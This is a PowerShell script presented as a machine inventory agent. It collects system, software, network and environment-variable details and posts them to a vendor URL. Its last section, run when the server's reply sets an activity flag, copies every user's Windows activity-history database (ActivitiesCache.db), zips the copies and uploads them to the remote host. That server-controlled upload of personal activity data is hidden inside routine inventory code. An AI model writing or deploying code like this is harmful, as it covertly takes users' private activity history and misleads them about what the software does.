# inventory_v3.ps1
$Target = $env:computername
$AgentVersion = "3.0"
$posturl = "https://inventory.idfexchg.unowhy.com/"



$ComputerSystem = Get-WmiObject -computername $Target Win32_ComputerSystem
switch ($ComputerSystem.DomainRole){
    0 { $ComputerRole = "Standalone Workstation" }
    1 { $ComputerRole = "Member Workstation" }
    2 { $ComputerRole = "Standalone Server" }
    3 { $ComputerRole = "Member Server" }
    4 { $ComputerRole = "Domain Controller" }
    5 { $ComputerRole = "Domain Controller" }
    default { $ComputerRole = "Information not available" }
}

$OperatingSystems = Get-WmiObject -computername $Target Win32_OperatingSystem
$TimeZone = Get-WmiObject -computername $Target Win32_Timezone
$Keyboards = Get-WmiObject -computername $Target Win32_Keyboard
$SchedTasks = Get-WmiObject -computername $Target Win32_ScheduledJob
$BootINI = $OperatingSystems.SystemDrive + "boot.ini"
$RecoveryOptions = Get-WmiObject -computername $Target Win32_OSRecoveryConfiguration

switch ($ComputerRole){
    "Member Workstation" { $CompType = "Computer Domain"; break }
    "Domain Controller" { $CompType = "Computer Domain"; break }
    "Member Server" { $CompType = "Computer Domain"; break }
    default { $CompType = "Computer Workgroup"; break }
}

$LBTime=$OperatingSystems.ConvertToDateTime($OperatingSystems.Lastbootuptime)

Write-Output "..System BIOS"
$ComputerBios = Get-WmiObject -Computername $Target Win32_BIOS

Write-Output "..Regional Options"
$ObjKeyboards = Get-WmiObject -ComputerName $Target Win32_Keyboard
$keyboardmap = @{
"00000402" = "BG" 
"00000404" = "CH" 
"00000405" = "CZ" 
"00000406" = "DK" 
"00000407" = "GR" 
"00000408" = "GK" 
"00000409" = "US" 
"0000040A" = "SP" 
"0000040B" = "SU" 
"0000040C" = "FR" 
"0000040E" = "HU" 
"0000040F" = "IS" 
"00000410" = "IT" 
"00000411" = "JP" 
"00000412" = "KO" 
"00000413" = "NL" 
"00000414" = "NO" 
"00000415" = "PL" 
"00000416" = "BR" 
"00000418" = "RO" 
"00000419" = "RU" 
"0000041A" = "YU" 
"0000041B" = "SL" 
"0000041C" = "US" 
"0000041D" = "SV" 
"0000041F" = "TR" 
"00000422" = "US" 
"00000423" = "US" 
"00000424" = "YU" 
"00000425" = "ET" 
"00000426" = "US" 
"00000427" = "US" 
"00000804" = "CH" 
"00000809" = "UK" 
"0000080A" = "LA" 
"0000080C" = "BE" 
"00000813" = "BE" 
"00000816" = "PO" 
"00000C0C" = "CF" 
"00000C1A" = "US" 
"00001009" = "US" 
"0000100C" = "SF" 
"00001809" = "US" 
"00010402" = "US" 
"00010405" = "CZ" 
"00010407" = "GR" 
"00010408" = "GK" 
"00010409" = "DV" 
"0001040A" = "SP" 
"0001040E" = "HU" 
"00010410" = "IT" 
"00010415" = "PL" 
"00010419" = "RU" 
"0001041B" = "SL" 
"0001041F" = "TR" 
"00010426" = "US" 
"00010C0C" = "CF" 
"00010C1A" = "US" 
"00020408" = "GK" 
"00020409" = "US" 
"00030409" = "USL" 
"00040409" = "USR" 
"00050408" = "GK" 
}
$layout = $ObjKeyboards.Layout
if($layout -is [system.array]){
    $layout = $layout[0]
}
$keyb = $keyboardmap.$($layout)
if (!$keyb)
{ 
    $keyb = "Unknown"
}
$serial = $ComputerBios.SerialNumber
$output = @{}
$output['System'] = @{}
$output['System']['serial'] = $ComputerBios.SerialNumber
$output['System']['Computer Name'] = $ComputerSystem.Name
$output['System']["Computer Name"] = $ComputerSystem.Name
$output['System']["Computer Role"] = $ComputerRole
$output['System']["Domain"] = $ComputerSystem.Domain
$output['System']["Operating System"] = $OperatingSystems.Caption
$output['System']["Operating System Version"] = $OperatingSystems.Version
$output['System']["Service Pack"] = $OperatingSystems.CSDVersion
$output['System']["System Root"] = $OperatingSystems.SystemDrive
$output['System']["Manufacturer"] = $ComputerSystem.Manufacturer
$output['System']["Model"] = $ComputerSystem.Model
$output['System']["Number of Processors"] = $ComputerSystem.NumberOfProcessors
$output['System']["Memory"] = $ComputerSystem.TotalPhysicalMemory
$output['System']["Registered User"] = $ComputerSystem.PrimaryOwnerName
$output['System']["Registered Organisation"] = $OperatingSystems.Organization
$output['System']["Last System Boot"] = $LBTime.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffK")
$output['System']["Time Zone"] = $TimeZone.Description
$output['System']["Audit Time"] =  (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffK")
$output['System']["AgentVersion"] =  $AgentVersion
$output['Bios'] = @{}
$output['Bios']["Manufacturer"] = $ComputerBios.Manufacturer
$output['Bios']["SMBIOSBIOSVersion"] = $ComputerBios.SMBIOSBIOSVersion
$output['Bios']["Name"] = $ComputerBios.Name
$output['Bios']["Version"] = $ComputerBios.Version
$output['Bios']["Serial Number"] = $ComputerBios.SerialNumber
$output['Regional'] = @{}
$output['Regional']["Time Zone"] = $TimeZone.Description
$output['Regional']["Country Code"] = $OperatingSystems.Countrycode
$output['Regional']["Locale"] = $OperatingSystems.Locale
$output['Regional']["Operating System Language"] = $OperatingSystems.OSLanguage
$output['Regional']["Keyboard Layout"] = $keyb
$output['Regional']["Keyboard Layout Code"] = $ObjKeyboards.Layout
$colQuickFixes = Get-WmiObject Win32_QuickFixEngineering
$output['Hotfix'] = $colQuickFixes | Where {$_.HotFixID -ne "File 1" } |Select HotFixID, Description
Write-Output "..Processor Information"
$output['Processor'] = @()
$ProcessorInfos = Get-WmiObject -ComputerName $Target Win32_Processor
Foreach ($ProcessorInfo in ($ProcessorInfos)){
    $Details = @{}
    $Details.Name = $ProcessorInfo.Name
    $Details.Manufacturer = $ProcessorInfo.Manufacturer
    $Details.MaxClockSpeed = $ProcessorInfo.MaxClockSpeed
    $Details.NumberOfCores = $ProcessorInfo.NumberOfCores
    $Details.NumberOfLogicalProcessors = $ProcessorInfo.NumberOfLogicalProcessors
    $output['Processor'] += $Details
} 
#Get-WmiObject -ComputerName $Target Win32_Processor | Select Name, Manufacturer, MaxClockSpeed, NumberOfCores, NumberOfLogicalProcessors
Write-Output "..Ram Information"
$output['Ram']  = @()
$RamInfos = Get-WmiObject -ComputerName $Target win32_physicalmemory
Foreach ($RamInfo in ($RamInfos)){
    $Details = @{}
    $Details."Manufacturer" = $RamInfo.Manufacturer
    $Details."PartNumber" = $RamInfo.PartNumber
    $Details."BankLabel" = $RamInfo.BankLabel
    $Details."Capacity (Mb)" = [math]::round(($RamInfo.Capacity / 1MB))
    $output['Ram']  += $Details
}
$output['PhysicalDrives']  = @()
$PhisicalDrives = Get-WmiObject -ComputerName $Target Win32_DiskDrive
Foreach ($Drive in ($PhisicalDrives)){
    $Details = @{}
    $Details."Model" = $Drive.Model
    $Details."Size (GB)" = [math]::round(($Drive.Size / 1GB))
    $Details."InterfaceType" = $Drive.InterfaceType
    $Details."Manufacturer" = $Drive.Manufacturer
    $output['PhysicalDrives'] += $Details
}
$output['VideoControllers'] = @()
$VideoControllers = Get-WmiObject -ComputerName $Target Win32_VideoController
Foreach ($VideoController in ($VideoControllers)){
    $Details = @{}
    $Details."Name" = $VideoController.Name
    $Details."AdapterRAM (MB)" = [math]::round(($VideoController.AdapterRAM / 1MB))
    $Details."VideoModeDescription" = $VideoController.VideoModeDescription
    $output['VideoControllers'] += $Details
}
$output['SoundDevices'] = @()
$SoundDevices = Get-WmiObject -ComputerName $Target Win32_SoundDevice
Foreach ($SoundDevice in ($SoundDevices)){
    $Details = @{}
    $Details."Name" = $SoundDevice.Name
    $Details."ProductName" = $SoundDevice.ProductName
    $Details."Manufacturer" = $SoundDevice.Manufacturer
    $output['SoundDevices'] += $Details
}
$output['Battery'] = @()
$Battery = Get-WmiObject -ComputerName $Target Win32_Battery
Foreach ($Bat in ($Battery)){
    $Details = @{}
    $Details."Name" = $Bat.Name
    $Details."Status" = $Bat.Status
    $Details."EstimatedChargeRemaining" = $Bat.EstimatedChargeRemaining
    $Details."DesignVoltage" = $Bat.DesignVoltage
    $Details."Manufacturer" = $Bat.Manufacturer
    $Details."EstimatedRuntime" = $Bat.EstimatedRunTime
    $output['Battery'] += $Details
}
$output['Printers'] = @()
$Printers = Get-WmiObject -ComputerName $Target Win32_Printer
Foreach ($Printer in ($Printers)){
    $Details = @{}
    $Details."Name" = $Printer.Name
    $Details."PrinterStatus" = $Printer.PrinterStatus
    $Details."PortName" = $Printer.PortName
    $output['Printers'] += $Details
}
$output['Services'] = @()
$Services = Get-WmiObject -ComputerName $Target Win32_Service
Foreach ($Service in ($Services)){
    $Details = @{}
    $Details."Name" = $Service.Name
    $Details."State" = $Service.State
    $Details."StartMode" = $Service.StartMode
    $output['Services'] += $Details
}
$output['BaseBoard'] = @()
$BaseBoards = Get-WmiObject -ComputerName $Target Win32_BaseBoard
Foreach ($BaseBoard in ($BaseBoards)){
    $Details = @{}
    $Details."Manufacturer" = $BaseBoard.Manufacturer
    $Details."Model" = $BaseBoard.Model
    $Details."SerialNumber" = $BaseBoard.SerialNumber
    $output['BaseBoard'] += $Details
}
$output['StartupPrograms'] = @()
$StartupPrograms = Get-WmiObject -ComputerName $Target Win32_StartupCommand
Foreach ($StartupProgram in ($StartupPrograms)){
    $Details = @{}
    $Details."Name" = $StartupProgram.Name
    $Details."Location" = $StartupProgram.Location
    $Details."Command" = $StartupProgram.Command
    $output['StartupPrograms'] += $Details
}   
$output['EnvironmentVariables'] = @()
$EnvironmentVariables = Get-WmiObject -ComputerName $Target Win32_Environment
Foreach ($EnvironmentVariable in ($EnvironmentVariables)){
    $Details = @{}
    $Details."Name" = $EnvironmentVariable.Name
    $Details."VariableValue" = $EnvironmentVariable.VariableValue
    $output['EnvironmentVariables'] += $Details
}
$output['Shares'] = @()
$Shares = Get-WmiObject -ComputerName $Target Win32_Share
Foreach ($Share in ($Shares)){
    $Details = @{}
    $Details."Share Name" = $Share.Name
    $Details."Share Path" = $Share.Path
    $Details."Share Type" = $Share.Type
    $output['Shares'] += $Details
}
$output['UsbControllers'] = @()
$UsbControllers = Get-WmiObject -ComputerName $Target Win32_USBController
Foreach ($UsbController in ($UsbControllers)){
    $Details = @{}
    $Details."Name" = $UsbController.Name
    $Details."Manufacturer" = $UsbController.Manufacturer
    $output['UsbControllers'] += $Details
}
$output['UsbDevices'] = @()
$UsbDevices = Get-WmiObject -ComputerName $Target Win32_USBHub
Foreach ($UsbDevice in ($UsbDevices)){
    $Details = @{}
    $Details."Name" = $UsbDevice.Name
    $Details."Manufacturer" = $UsbDevice.Manufacturer
    $output['UsbDevices'] += $Details
}

Write-Output "..Logical Disks"
$Disks = Get-WmiObject -ComputerName $Target Win32_LogicalDisk
$output['LogicalDisks'] = @()
Foreach ($LDrive in ($Disks | Where {$_.DriveType -eq 3})){
        $Details = "" | Select "Drive Letter", Label, "File System", "Disk Size (MB)", "Disk Free Space", "% Free Space"
        $Details."Drive Letter" = $LDrive.DeviceID
        $Details.Label = $LDrive.VolumeName
        $Details."File System" = $LDrive.FileSystem
        $Details."Disk Size (MB)" = [math]::round(($LDrive.size / 1MB))
        $Details."Disk Free Space" = [math]::round(($LDrive.FreeSpace / 1MB))
        $Details."% Free Space" = [Math]::Round(($LDrive.FreeSpace /1MB) / ($LDrive.Size / 1MB) * 100)
        $output['LogicalDisks'] += $Details
    }
Write-Output "..Network Configuration"
$Adapters = Get-WmiObject -ComputerName $Target Win32_NetworkAdapterConfiguration

$output['Network Adapters'] = @()
Foreach ($Adapter in ($Adapters | Where {$_.IPEnabled -eq $True})) {
    $Details = @{}
    $Details."Description" = "$($Adapter.Description)"
    $Details."MACaddress" = "$($Adapter.MACaddress)"
    if ($serial -eq "Default string") {
        $serial = "MAC_$($Adapter.MACaddress)"
        $output['System']['badserial'] =$output['System']['serial']
        $output['System']['serial'] = $serial
    }
    If ($Adapter.IPAddress -ne $Null) {
        $Details."IP Address / Subnet Mask" = "$($Adapter.IPAddress)/$($Adapter.IPSubnet)"
        $Details."DefaultIPGateway" = "$($Adapter.DefaultIPGateway)"
    }
    If ($Adapter.DHCPEnabled -eq "True")	{
        $Details."DHCPEnabled" = "Yes"
    }
    Else {
        $Details."DHCPEnabled" = "No"
    }
    If ($Adapter.DNSServerSearchOrder -ne $Null)	{
        $Details.DNSServerSearchOrder =  "$($Adapter.DNSServerSearchOrder)"
    }
    $Details.WINS = "$($Adapter.WINSPrimaryServer) $($Adapter.WINSSecondaryServer)"
    $output['Network Adapters'] += $Details
}

$output['Applications'] = @()
$InstalledSoftware = Get-WmiObject -ComputerName $Target Win32_Product
Foreach ($Software in ($InstalledSoftware)){
    $Details = @{}
    $Details."Scope" = "System"
    $Details."Detection" = "Win32_Product"
    $Details."Name" = $Software.Name
    $Details."Version" = $Software.Version
    $Details."Vendor" = $Software.Vendor
    $Details."GUID" =  $Software.IdentifyingNumber
    $Details."UninstallKey" = $Software.InstallLocation
    $Details."InstalledDate" = $Software.InstallDate

    $output['Applications'] += $Details
}

$UninstallRegKey="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
$InstalledSoftware = Get-WmiObject -ComputerName $Target Win32_Product

# extra app part
# Get the architecture 32/64 bit
if ((Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Target -ea 0).OSArchitecture -eq '64-bit')
{
    # If 64 bit check both 32 and 64 bit locations in the registry
    $RegistryViews = @('Registry32','Registry64')
} else {
    # Otherwise only 32 bit
    $RegistryViews = @('Registry32')
}
foreach ( $RegistryView in $RegistryViews ){
    $HKLM = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $Target,$RegistryView)
    $UninstallRef = $HKLM.OpenSubKey($UninstallRegKey)
    $Applications = $UninstallRef.GetSubKeyNames()
    foreach ($App in $Applications)
    {
        $AppRegistryKey = $UninstallRegKey + "\\" + $App
        $AppDetails = $HKLM.OpenSubKey($AppRegistryKey)
        if(!$($AppDetails.GetValue("DisplayName"))) { continue }
        $Details = @{}
        $Details."Scope" = "System"
        $Details."Detection" = "Registry"
        $Details."Name" = $($AppDetails.GetValue("DisplayName"))
        $Details."Version" = $($AppDetails.GetValue("DisplayVersion"))
        $Details."Vendor" = $($AppDetails.GetValue("Publisher"))
        $Details."InstalledDate" = $($AppDetails.GetValue("InstallDate"))
        $Details."GUID" =  $App
        $Details."UninstallKey" = $($AppDetails.GetValue("UninstallString"))
        $output['Applications'] += $Details
    }
}
# get user installed apps
$strRegType = [Microsoft.Win32.RegistryHive]::Users
$HKU  = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($strRegType, $strIPAddrTmp)
$userkeys = $HKU.GetSubKeyNames()
foreach ($userkey in $userkeys) {
    $HKUUser = $HKU.OpenSubKey($userkey + "\Software\Microsoft\Windows\CurrentVersion\Uninstall")
    if (!$HKUUser) { continue }
    $Applications = $HKUUser.GetSubKeyNames()
    foreach ($App in $Applications)
    {
        $AppDetails = $HKUUser.OpenSubKey($App)
        if(!$($AppDetails.GetValue("DisplayName"))) { continue }
        $Details = @{}
        $Details."Scope" = "User:" + $userkey
        $Details."Detection" = "Registry"
        $Details."Name" = $($AppDetails.GetValue("DisplayName"))
        $Details."Version" = $($AppDetails.GetValue("DisplayVersion"))
        $Details."Vendor" = $($AppDetails.GetValue("Publisher"))
        $Details."InstalledDate" = $($AppDetails.GetValue("InstallDate"))
        $Details."GUID" =  $App
        $Details."UninstallKey" = $($AppDetails.GetValue("UninstallString"))
        $output['Applications'] += $Details
    }
}

# remove non-ascii characters
$o = $output| ConvertTo-Json
$o = $o -creplace '[^\p{IsBasicLatin}]', ''

#$Filename = "$PSScriptRoot\inventory.json"
#$o | Out-File $Filename

$postdest = $posturl + "inventory/new/" + [System.Web.HttpUtility]::UrlEncode($serial)
$result = Invoke-WebRequest -Uri $postdest -Method POST -Body $o -ContentType "application/json" -UseBasicParsing
$srvinfo = $result.Content |  ConvertFrom-Json
Write-Output "Activities : " $srvinfo.doactivity
Write-Output "OK : $($srvinfo.ok)"

if (-not ($srvinfo.doactivity)){
    Write-Output "no activities"
    return
}
Write-Output "Processing activities"
Set-Location $env:TEMP
[string] $Dirname = [System.Guid]::NewGuid()
$tempdir = New-item -ItemType Directory -Path $Dirname
Set-Location $tempdir

$dbs = Get-ChildItem $env:SystemDrive\Users\*\AppData\Local\ConnectedDevicesPlatform\*\ActivitiesCache.db

$dbs |Foreach-Object {
    $dest = (Split-Path $_.DirectoryName -Leaf) + ".db"
    Copy-Item -Path $_.FullName -Destination $dest
    Compress-Archive -Update $dest Upload.zip
    #Remove-Item -Path $dest
}
$actdest = $posturl + "inventory/activitydb/" + [System.Web.HttpUtility]::UrlEncode($serial)

$upload= Invoke-RestMethod -Uri $actdest -Method Post -InFile Upload.zip -ContentType 'multipart/form-data' 

Set-Location $env:TEMP
Remove-Item $tempdir -Force -Recurse



